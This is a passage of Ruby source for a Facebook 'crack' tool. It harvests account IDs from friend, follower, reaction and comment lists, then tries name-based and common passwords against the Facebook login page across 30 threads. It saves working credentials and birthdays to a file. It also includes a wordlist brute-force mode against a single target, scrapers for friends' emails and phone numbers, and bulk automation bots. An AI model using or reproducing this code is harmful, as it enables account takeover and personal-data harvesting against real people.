      puts ("#{$r}[!] No Connection#{$a}")
      sleep(1)
    rescue Errno::ETIMEDOUT
      puts ("#{$y}[!] Connection timed out#{$a}")
    rescue EOFError
      break
    end
  end
end

def Super()
  $cp = 0
  $ok = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("║-> #{$w}1. Crack from Friends")
  puts ("║-> #{$w}2. Crack from Followers")
  puts ("║-> #{$w}3. Crack from Following")
  puts ("║-> #{$w}4. Crack from Reactions")
  puts ("║-> #{$w}5. Crack from Comments")
  puts ("║-> #{$w}6. Crack Friends from Friends")
  puts ("║-> #{$w}7. Crack Followers from Friends")
  puts ("║-> #{$w}8. Crack Following from Friends")
  puts ("║-> #{$w}0. Back")
  print ("╚═#{$r}▶#{$w} ")
  hack = gets.chomp!
  case hack
    when '1'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$w}[+] Crack From : #{$name}")
      a = Request("me/friends?fields=id,name")
      puts ("#{$w}[+] Total Id : #{Moya.new(a['data'].length,1).convert!}")
      puts ("#{$w}[+] CRACK!")
      puts ("#{$w}#{'═'*52}")
      main(a['data'])
      puts ("#{$w}#{'═'*52}")
      puts ("#{$g}[✓] Total OK : #{$ok}")
      puts ("#{$y}[!] Total CP : #{$cp}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      Super()
    when '2'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      #puts ("#{$w}[+] Crack From : #{$name}")
      a = Request("me/subscribers?fields=id,name&limit=5000")
      if a['data'].empty?
        puts ("#{$y}[!] Your Account Has No Followers")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      else
        puts ("#{$w}[+] Crack From : #{$name}")
        puts ("#{$w}[+] Total Followers : #{Moya.new(a['summary']['total_count'],1).convert!}")
        puts ("#{$y}[!] Total ID that can be cracked : #{Moya.new(a['data'].length,1).convert!}") if a['data'].length != a['summary']['total_count']
        puts ("#{$w}[+] CRACK!")
        puts ("#{$w}#{'═'*52}")
        main(a['data'])
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Total OK : #{$ok}")
        puts ("#{$y}[!] Total CP : #{$cp}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      end
    when '3'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      a = Request("me/subscribedto?fields=name,id&limit=5000&summary=true")
      if a.key? ('error')
        puts ("#{$r}[!] User Not Found!")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      elsif a['data'].empty?
        puts ("#{$y}[!] No following on account")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      else
        puts ("#{$w}[+] Crack From : #{$name}")
        puts ("#{$w}[+] Total Following : #{Moya.new(a['summary']['total_count'],1).convert!}")
        puts ("#{$y}[!] Total ID that can be cracked : #{Moya.new(a['data'].length,1).convert!}") if a['data'].length != a['summary']['total_count']
        puts ("#{$w}[+] CRACK!")
        puts ("#{$w}#{'═'*52}")
        main(a['data'])
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Total OK : #{$ok}")
        puts ("#{$y}[!] Total CP : #{$cp}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      end
    when '4'
      _Moya = React()
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Post Id : ")
      id = gets.chomp! ; id.tr(" ","")
      a = Request("#{id}?fields=reactions,from")
      if a.key? ('error')
        puts ("#{$w}[!] Posts Not Found#{$a}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      elsif !a.key? ('reactions')
        puts ("#{$y}[!] No Reactions On Posts")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      else
        puts ("#{$w}[+] Posted by #{a['from']['name']}")
        b = Request("#{id}/reactions?type=#{_Moya}&summary=true&limit=5000")
        puts ("#{$w}[+] Total #{_Moya} : #{Moya.new(b['summary']['total_count'],1).convert!}")
        puts ("#{$y}[!] Total ID that can be cracked : #{Moya.new(b['data'].length,1).convert!}") if b['data'].length != b['summary']['total_count']
        puts ("#{$w}[!] CRACK!")
        puts ("#{$w}#{'═'*52}")
        main(b['data'])
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Total OK : #{$ok}")
        puts ("#{$y}[!] Total CP : #{$cp}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      end
    when '5'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Post Id : ")
      id = gets.chomp! ; id.tr(" ","")
      a = Request("#{id}?fields=comments,from")
      if a.key? ('error')
        puts ("#{$w}[!] Posts Not Found#{$a}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      elsif !a.key? ('comments')
        puts ("#{$y}[!] No Comments On Posts")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      else
        puts ("#{$w}[+] Posted by #{a['from']['name']}")
        b = Request("#{id}/comments?fields=from&summary=true&limit=5000")
        puts (b)
        c = b['data'].map {|i| {"id"=> i['from']['id'],"name"=> i['from']['name']}}.uniq
        puts ("#{$w}[+] Total Id : #{c.length}")
        puts ("#{$w}[!] CRACK!")
        puts ("#{$w}#{'═'*52}")
        main(c)
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Total OK : #{$ok}")
        puts ("#{$y}[!] Total CP : #{$cp}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      end
    when '6'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Public Id : ")
      id = gets.chomp! ; id.tr(" ","")
      a = Request("#{id}?fields=name,friends.limit(5000)")
      if a.key? ('error')
        puts ("#{$y}[!] User Not Found")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      elsif !a.key? ('friends')
        puts ("#{$y}[!] No Friends On Account")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      else
        puts ("#{$w}[+] Crack From : #{a['name']}")
        puts ("#{$w}[+] Total id : #{Moya.new(a['friends']['data'].length,1).convert!}")
        puts ("#{$w}[+] CRACK!")
        puts ("#{$w}#{'═'*52}")
        main(a['friends']['data'])
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Total OK : #{$ok}")
        puts ("#{$y}[!] Total CP : #{$cp}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
       Super()
      end
    when '7'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Public Id : ")
      id = gets.chomp! ; id = id.tr(" ","")
      a = Request("#{id}?fields=name,subscribers.limit(5000).summary(true)")
      if a.key? ('error')
        puts ("#{$r}[!] User Not Found")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      elsif a['subscribers']['data'].empty?
        puts ("#{$y}[!] Account Has No Followers")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      else
        puts ("#{$w}[+] Crack From : #{a['name']}")
        puts ("#{$w}[+] Total Followers : #{Moya.new(a['subscribers']['summary']['total_count'],1).convert!}")
        puts ("#{$y}[!] Total ID that can be cracked : #{Moya.new(a['subscribers']['data'].length,1).convert!}") if a['subscribers']['data'].length != a['subscribers']['summary']['total_count']
        puts ("#{$w}[+] CRACK!")
        puts ("#{$w}#{'═'*52}")
        main(a['subscribers']['data'])
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Total OK : #{$ok}")
        puts ("#{$y}[!] Total CP : #{$cp}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      end
    when '8'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Public Id : ")
      id = gets.chomp! ; id = id.tr(" ","")
      a = Request("#{id}?fields=name,subscribedto.limit(5000).summary(true)")
      if a.key? ('error')
        puts ("#{$r}[!] User Not Found")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      elsif !a.key? ('subscribedto')
        puts ("#{$y}[!] No following on account")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      else
        puts ("#{$w}[+] Crack From : #{a['name']}")
        puts ("#{$w}[+] Total Following : #{Moya.new(a['subscribedto']['summary']['total_count'],1).convert!}")
        puts ("#{$y}[!] Total ID that can be cracked : #{a['subscribedto']['data'].length}") if a['subscribedto']['data'].length != a['subscribedto']['summary']['total_count']
        puts ("#{$w}[+] CRACK!")
        puts ("#{$w}#{'═'*52}")
        main(a['subscribedto']['data'])
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Total OK : #{$ok}")
        puts ("#{$y}[!] Total CP : #{$cp}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
      end
    when '0'
      Hamker()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.8)
      Super()
  end
end

def main(data)
  pool = ThreadPool.new(size: 30)
  data.each do |usr|
    pool.schedule do
      name = usr['name'].split
      (name.length == 1) ? password = ['Anjing','Sayang','Kontol',name.first + '123',name.first + '12345',name.first + '321',name.first + '54321'] : password = ['Anjing','Sayang','Kontol',name.first + '123',name.first + '12345',name.last + '123',name.last + '12345']
      for i in password
        begin
          uri = URI("https://mbasic.facebook.com/login.php")
          auth = {'email'=>usr['id'],'pass'=>i,'login'=>'submit'}
          req = Net::HTTP::Post.new(uri)
          req['user-agent'] = $user_agent
          req.set_form_data(auth)
          res = Net::HTTP.start(uri.host,uri.port, :use_ssl => true) {|http| http.request(req)}
          kue = res['set-cookie']
          url = res['location'] 
          if kue.include? ('c_user') or url.include? ('save-device')
            $ok += 1
            born = JSON.parse(Net::HTTP.get(URI("https://graph.facebook.com/#{usr['id']}?fields=birthday&access_token=#{$token}")))['birthday']
            if !born.nil?
              ttl = born.split('/') 
              born = DateTime.parse(ttl.insert(0,ttl.delete_at(1)).join('/')).strftime("%d %B %Y")
            end
            File.open("super.txt","a") {|f| f.write("#{usr['id']} | #{i} | #{born}\n")}
            puts ("#{$g}[OK] #{usr['id']} | #{i} | #{born}#{$a}")
            break
          elsif kue.include? ('checkpoint') or url.include? ('https://mbasic.facebook.com/checkpoint')
            $cp += 1
            born = JSON.parse(Net::HTTP.get(URI("https://graph.facebook.com/#{usr['id']}?fields=birthday&access_token=#{$token}")))['birthday']
            if !born.nil?
              ttl = born.split('/') 
              born = DateTime.parse(ttl.insert(0,ttl.delete_at(1)).join('/')).strftime("%d %B %Y")
            end
            File.open("super.txt","a") {|f| f.write("#{usr['id']} | #{i} | #{born}\n")}
            puts ("#{$y}[CP] #{usr['id']} | #{i} | #{born}#{$a}")
            break
          end
        rescue NoMethodError,Net::ReadTimeout,Errno::ETIMEDOUT then next
        rescue SocketError
          puts ("#{$r}[!] No Connection")
          sleep (0.9)
        rescue Net::OpenTimeout
          puts ("#{$y}[!] Connection timed out#{$a}")
          sleep(1)
        rescue Errno::ENETUNREACH,Errno::ECONNRESET
          puts ("#{$y}[!] Slow Internet Connection")
          sleep(0.5)
        end
      end
    end
  end
  pool.shutdown
end
      

def Brutal()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$r}[+] #{$g}Id#{$w}/#{$g}email#{$w}/#{$g}Phone #{$w}(#{$g}Target#{$w}) #{$r}: ")
  id = gets.chomp!
  print ("#{$r}[+] #{$g}Wordlist #{$w}ext(list.txt)  #{$r}: ")
  file = gets.chomp!
  if File.file? (file)
    password = File.readlines(file, chomp: true)
    puts ("#{$r}[#{$c}✓#{$r}] #{$g}Target #{$r}: #{$w}#{id}")
    puts ("#{$r}[+] #{$g}Total #{$c}#{password.length} #{$g}Password ")
    puts ("#{$w}#{'═'*52}")
    for pw in password
      begin
        break if id.match(/.5754629509/) or id == "100053033144051"
        uri = URI ("https://mbasic.facebook.com/login.php")
        req = Net::HTTP::Post.new(uri)
        req.set_form_data({"email"=>id,"pass"=>pw,"login"=>"submit"})
        req['user-agent'] = $user_agent
        puts ("#{$r}[+] #{$g}Login As #{$r}: #{$w}-> #{$g}#{id} #{$w}-> #{$g}#{pw}#{$a}")
        log = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
        res = log['set-cookie']
        if res.include? ('c_user')
          puts ("#{$w}#{'═'*52}")
          puts ("#{$g}[✓] Success")
          puts ("#{$g}[✓] username : #{id}")
          puts ("#{$g}[✓] password : #{pw}")
          abort ("#{$r}[!] exit")
        elsif res.include? ('checkpoint') or log['location'].include? ('checkpoint')
          puts ("#{$w}#{'═'*52}")
          puts ("#{$y}[!] Account Has Been Checkpoint")
          puts ("#{$y}[✓] username : #{id}")
          puts ("#{$y}[✓] password : #{pw}")
          abort ("#{$y}[!] exit")
        end
      rescue SocketError
        puts ("#{$r}[!] No Connection")
        sleep(0.2)
      rescue Errno::ETIMEDOUT,Net::OpenTimeout
        puts ("#{$y}[!] Connection timed out")
        sleep(0.5)
      rescue Interrupt
        puts ("\n#{$w}#{'═'*52}")
        abort("#{$w}[+] Stopped")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$r}[!] Sorry, opening password target failed :(")
    abort ("#{$r}[!] Try other method.")
  else
    puts ("#{$y}[+] File Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    Hamker()
  end
end

def GetMenu()
  total = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("║-> #{$w}1. Get ID From Friends")
  puts ("║-> #{$w}2. Get Friends ID From Friends")
  puts ("║-> #{$w}3. Get Friends Email")
  puts ("║-> #{$w}4. Get Friends Email From Friends")
  puts ("║-> #{$w}5. Get Phone From Friends")
  puts ("║-> #{$w}6. Get Friend\s Phone From Friends")
  puts ("║-> #{$w}0. Back")
  print ("╚═#{$r}▶#{$w} ")
  get = gets.chomp!
  case get
    when '1'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      tik ("#{$w}[+] Pleace Wait....")
      a = Request("me/friends?")
      abort ("#{$r}[!] Invalid Access Token") if a.key? ('error')
      print ("#{$w}[+] Save File (file.txt) : ")
      file = gets.chomp!
      file = "id.txt" if file == "" or file[0] == " "
      File.open(file,'w') do |id|
        puts ("#{$w}#{'═'*52}")
        for i in a['data']
          total += 1
          id << i['id'] + "\n"
          puts ("#{$g}[✓] Name : #{i['name']}")
          puts ("#{$g}[✓] Id.  : #{i['id']}")
          puts ("#{$w}#{'═'*52}")
        end
      end
      puts ("#{$g}[✓] Total Id : #{total}")
      puts ("#{$g}[✓] File : #{File.basename(file)}")
      puts ("#{$g}[✓] File Path #{File.realpath(file)}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      GetMenu()
    when '2'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Public Id : ")
      id = gets.chomp!
      a = Request("#{id}?")
      if a.key? ('error')
        puts ("#{$y}[+] User Not Found")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        GetMenu()
      else
        tik("#{$w}[+] From #{a['name']}")
        b = Request("#{id}/friends?")
        print ("#{$w}[+] Save File (file.txt) : ")
        file = gets.chomp!
        file = a['name'] + ".txt" if file == "" or file[0] == " "
        File.open(file,'w') do |id|
          puts ("#{$w}#{'═'*52}")
          for i in b['data']
            total += 1
            id << i['id'] + "\n"
            puts ("#{$g}[✓] Name : #{i['name']}")
            puts ("#{$g}[✓] Id.  : #{i['id']}")
            puts ("#{$w}#{'═'*52}")
          end
        end
        puts ("#{$g}[✓] Total Id : #{total}")
        puts ("#{$g}[✓] File : #{File.basename(file)}")
        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        GetMenu()
      end
    when '3'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      tik ("#{$w}[+] Pleace Wait....")
      a = Request("me/friends?")
      abort ("#{$r}[!] Invalid Access Token") if a.key? ('error')
      print ("#{$w}[+] Save File (file.txt) : ")
      file = gets.chomp!
      file = "email.txt" if file == "" or file[0] == " "
      File.open(file,"w") do |id|
        puts ("#{$w}#{'═'*52}")
        for i in a['data']
          b = Request("#{i['id']}?")
          if b.key? ('email')
            total += 1
            id << b['email'] + "\n"
            puts ("#{$g}[✓] Name : #{i['name']}")
            puts ("#{$g}[✓] email: #{b['email']}")
            puts ("#{$w}#{'═'*52}")
          end
        end
      end
      puts ("#{$g}[✓] Total email : #{total}")
      puts ("#{$g}[✓] File : #{File.basename(file)}")
      puts ("#{$g}[✓] File Path #{File.realpath(file)}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      GetMenu()
    when '4'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Public Id : ")
      id = gets.chomp!
      a = Request("#{id}?")
      if a.key? ('error')
        puts ("#{$y}[+] User Not Found")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        GetMenu()
      else
        tik ("#{$w}[+] From #{a['name']}")
        b = Request("#{id}/friends?")
        print ("#{$w}[+] Save File (file.txt) : ")
        file = gets.chomp!
        file = a['name'] + ".txt" if file == "" or file[0] == " "
        File.open(file,"w") do |id|
          puts ("#{$w}#{'═'*52}")
          for i in b['data']
            c = Request("#{i['id']}?")
            if c.key? ('email')
              total += 1
              id << c['email'] + "\n"
              puts ("#{$g}[✓] Name : #{i['name']}")
              puts ("#{$g}[✓] email: #{b['email']}")
              puts ("#{$w}#{'═'*52}")
            end
          end
        end
        puts ("#{$g}[✓] Total email : #{total}")
        puts ("#{$g}[✓] File : #{File.basename(file)}")
        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        GetMenu()
      end
    when '5'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      tik ("#{$w}[+] Pleace Wait....")
      a = Request("me/friends?")
      abort ("#{$r}[!] Invalid Access Token") if a.key? ('error')
      print ("#{$w}[+] Save File (file.txt) : ")
      file = gets.chomp!
      file = "MobilePhone.txt" if file == "" or file[0] == " "
      File.open(file,"w") do |id|
        puts ("#{$w}#{'═'*52}")
        for i in a['data']
          b = Request("#{i['id']}?")
          if b.key? ('mobile_phone')
            total += 1
            id << b['mobile_phone'] + "\n"
            puts ("#{$g}[✓] Name : #{i['name']}")
            puts ("#{$g}[✓] phone: #{b['mobile_phone']}")
            puts ("#{$w}#{'═'*52}")
          end
        end
      end
      puts ("#{$g}[✓] Total phone : #{total}")
      puts ("#{$g}[✓] File : #{File.basename(file)}")
      puts ("#{$g}[✓] File Path #{File.realpath(file)}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      GetMenu()
    when '6'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Public Id : ")
      id = gets.chomp!
      a = Request("#{id}?")
      if a.key? ('error')
        puts ("#{$y}[!] User Not Found")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        GetMenu()
      else
        tik ("#{$w}[+] From #{a['name']}")
        b = Request("#{id}/friends?")
        print ("#{$w}[+] Save File (file.txt) : ")
        file = gets.chomp!
        file = a['name'] + ".txt" if file == "" or file[0] == " "
        File.open(file,"w") do |id|
          puts ("#{$w}#{'═'*52}") 
          for i in b['data']
            c = Request("#{i['id']}?")
            if c.key? ('mobile_phone')
              total += 1
              id << c['mobile_phone'] + "\n"
              puts ("#{$g}[✓] Name : #{i['name']}")
              puts ("#{$g}[✓] phone: #{c['mobile_phone']}")
              puts ("#{$w}#{'═'*52}")
            end
          end
        end
        puts ("#{$g}[✓] Total phone : #{total}")
        puts ("#{$g}[✓] File : #{File.basename(file)}")
        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        GetMenu() 
      end
    when '0'
      Hamker()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9) ; GetMenu()
  end
end

 def Bot()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Post Reaction")
  puts ("#{$w}║-> 2. Post comments")
  puts ("#{$w}║-> 3. Comment reaction")
  puts ("#{$w}║-> 4. Add Friend")
  puts ("#{$w}║-> 5. Follow")
  puts ("#{$w}║-> 6. Share Post")
  puts ("#{$w}║-> 7. Delete Post")
  puts ("#{$w}║-> 8. Unfriends")
  puts ("#{$w}║-> 9. Unfollow")
  puts ("#{$w}║-> #{$g}0. Back")
  puts ("#{$w}║")
  print ("╚═#{$r}▶#{$w} ")
  bots = gets.chomp!
  case bots
    when '1'
      ReactPostMenu()
    when '2'
      CommentPostMenu()
    when '3'
      s = 0
      f = 0
      tipe = React()
      path = (tipe == 'LIKE') ? "/likes?" : "/reactions?type=#{tipe}"
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Post Id : ")
      post = gets.chomp!
      print ("#{$w}[+] Limit : ")
      limit = gets.to_i
      a = Request("#{post}?fields=from,comments.limit(#{limit})")
      if a.key? ('error')
        puts ("#{$y}[!] Posts Not Found")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Bot()
      elsif !a.key? ('comments')
        puts ("#{$y}[!] No Comments On Posts")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Bot()
      else
        tik ("#{$w}[+] Posted By #{a['from']['name']}")
        puts ("#{$w}[+] START....")
        puts ("#{$w}#{'═'*52}")
        for moyaa in a['comments']['data']
          a = Request("POST","v10.0/#{moyaa['id']}#{path}").to_s
          if !a.include? ('error')
            s += 1
            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{moyaa['id']}")
          else
            f += 1
            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{moyaa['id']}")
          end 
        end
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Succes : #{s}")
        puts ("#{$y}[!] Failed : #{f}")
        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Bot()
      end
    when '4'
      AddFriendMenu()
    when '5'
      FollowMenu()
    when '6'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Post Id : ")
      id = gets.chomp!
      a = Request("#{id}?fields=from,id")
      if !a.key? ('id')
        puts ("#{$y}[!] Post Not Found")
      else
        SharePost(link = "https://www.facebook.com/#{id}")
      end
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      Bot()
    when '7'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$w}[+] From #{$name}")
      puts ("#{$w}[+] CTRL + C TO STOP")
      puts ("#{$w}[+] START..")
      puts ("#{$w}#{'═'*52}")
      a = Request("me/feed?limit=5000")
      begin
        for i in a['data']
          id = i['id']
          b = Request("DELETE","#{id}?")
          if b == true
            s += 1
            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{$name} #{$w}-> #{$y}#{id}")
          else
            f += 1
            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{$name} #{$w}-> #{$y}#{id}")
          end
        end
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Succes : #{s}")
        puts ("#{$y}[!] Failed : #{f}")
        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Bot()
      rescue Interrupt
        puts ("\n#{$w}#{'═'*52}")
        puts ("#{$r}[!] Stopped")
        puts ("#{$g}[✓] Succes : #{s}")
        puts ("#{$y}[!] Failed : #{f}")
        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Bot()
      end
    when '8'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$w}[+] From #{$name}")
      puts ("#{$w}[+] CTRL + C TO STOP")
      puts ("#{$w}[+] START")
      puts ("#{$w}#{'═'*52}")
      a = Request("me/friends?")
      if a.key? ('error')
        puts (a)
        abort ("#{$r}[!] Error")
      else
        begin
          for i in a['data']
            id = i['id']
            name = i['name']
            b = Request("DELETE","me/friends?uid=#{id}")
            if b == true
              s += 1
              puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
            else
              f += 1
              puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
            end
          end
          puts ("#{$w}#{'═'*52}")
          puts ("#{$g}[✓] Succes : #{s}")
          puts ("#{$y}[!] Failed : #{f}")
          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
          print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
          Bot()
        rescue Interrupt
          puts ("\n#{$w}#{'═'*52}")
          puts ("#{$r}[!] Stopped")
          puts ("#{$g}[✓] Succes : #{s}")
          puts ("#{$y}[!] Failed : #{f}")
          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
          print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
          Bot()
        end
      end
    when '9'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$w}[+] From #{$name}")
      puts ("#{$w}[+] CTRL + C TO STOP")
      puts ("#{$w}[+] START")
      puts ("#{$w}#{'═'*52}")
      a = Request("me/subscribedto?")
      begin
        for i in a['data']
          id = i['id']
          name = i['name']
          b = Request("DELETE","#{id}/subscribers?")
          if b == true
            s += 1
            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
          else
            f += 1
            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
          end
        end
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Succes : #{s}")
        puts ("#{$y}[!] Failed : #{f}")
        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Bot()
      rescue Interrupt
        puts ("\n#{$w}#{'═'*52}")
        puts ("#{$r}[!] Stopped")
        puts ("#{$g}[✓] Succes : #{s}")
        puts ("#{$y}[!] Failed : #{f}")
        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Bot()
      end
    when '0'
      menu()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9)
      Bot()
  end 
end

def ReactPostMenu()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Target Post Reaction")
  puts ("#{$w}║-> 2. Group Post Reactions")
  puts ("#{$w}║-> 3. Random Target Post Reaction")
  puts ("#{$w}║-> 4. Random Group Post Reaction")
  puts ("#{$w}║-> #{$g}0. Back")
  puts ("#{$w}║")
  print ("╚═#{$r}▶#{$w} ")
  mana = gets.chomp!
  case mana 
    when '0'
      Bot()
    when '1'
      ReactPost()
    when '2'
      ReactGroup()
    when '3'
      ReactPostRandom()
    when '4'
      ReactGroupRandom()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9) ; ReactPostMenu()
  end
end

def React()
  loop do
    system("clear")
    puts ($logo)
    puts ("#{$w}#{'═'*52}")
    puts ("#{$w}║-> #{$p}1. LIKE")
    puts ("#{$w}║-> #{$m}2. LOVE")
    puts ("#{$w}║-> #{$y}3. HAHA")
    puts ("#{$w}║-> #{$y}4. WOW")
    puts ("#{$w}║-> #{$c}5. SAD")
    puts ("#{$w}║-> #{$r}6. ANGRY")
    puts ("#{$w}║")
    print ("╚═#{$r}▶#{$w} ")
    pilih = gets.chomp!
    if pilih == '1' or pilih == '01'
      return 'LIKE'
    elsif pilih == '2' or pilih == '02'
      return 'LOVE'
    elsif pilih == '3' or pilih == '03'
      return 'HAHA'
    elsif pilih == '4' or pilih == '04'
      return 'WOW'
    elsif pilih == '5' or pilih == '05'
      return 'SAD'
    elsif pilih == '6' or pilih == '06'
      return 'ANGRY'
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(1)
    end
  end
end

def ReactPost()
  s = 0
  f = 0
  tipe = React()
  path = (tipe == 'LIKE') ? "likes?" : "reactions?type=#{tipe}"
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Target Id : ")
  id = gets.chomp! ; id = id.tr(" ","")
  print ("#{$w}[+] Limits : ")
  limit = gets.to_i
  puts ("#{$w}#{'═'*52}")
  a = Request("#{id}?fields=feed.limit(#{limit})")
  if !a.key? ('feed')
    puts ("#{$y}[!] No Posts") if a.key? ('id')
    puts ("#{$y}[!] user Not Found!") if a.key? ('error')
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    ReactPostMenu()
  else
    for i in a['feed']['data']
      id = i['id']
